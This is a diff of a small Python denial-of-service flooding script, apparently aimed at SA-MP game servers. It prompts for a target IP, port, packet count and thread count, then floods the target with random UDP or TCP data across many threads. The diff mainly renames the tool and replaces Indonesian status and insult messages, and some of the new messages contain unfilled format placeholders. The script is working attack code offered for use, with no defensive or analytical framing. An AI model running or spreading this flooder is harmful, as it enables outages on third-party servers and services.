@@ -6,13 +6,13 @@ import os
 import sys
 
 os.system("clear")
-print("Tools by Phoenix")
-print("#-- SAMP DDOS --#")
+print("Tools by Zedyx")
+print("#-- TYDDOS --#")
 ip = str(input(" IP:"))
 port = int(input(" Port:"))
 choice = str(input(" UDP(y/n):"))
 times = int(input(" Paket yang dikirim :"))
-threads = int(input(" Utas (saran : 99999) :"))
+threads = int(input(" Utas :"))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[*]","[!]","[#]"))
@@ -22,9 +22,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" PAKET FROM OCTRA NIH DEK")
+			print(i +" MEMULAI SERANGAN KE: %s DAN PORT: %s DENGAN TOOLS TYDDOS ")
 		except:
-			print("YAH GAK KUAT KONTOL")
+			print("YAH LEMAH BANGET")
 
 def run2():
 	data = random._urandom(16)
@@ -36,10 +36,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" PAKET FROM OCTRA NIH DEK")
+			print(i +" MEMULAI SERANGAN KE: %s DAN PORT: %s DENGAN TOOLS TYDDOA")
 		except:
 			s.close()
-			print("YAH GAK KUAT KONTOL")
+			print("YAH LEMAH BANGET")
 
 for y in range(threads):
 	if choice == 'y':
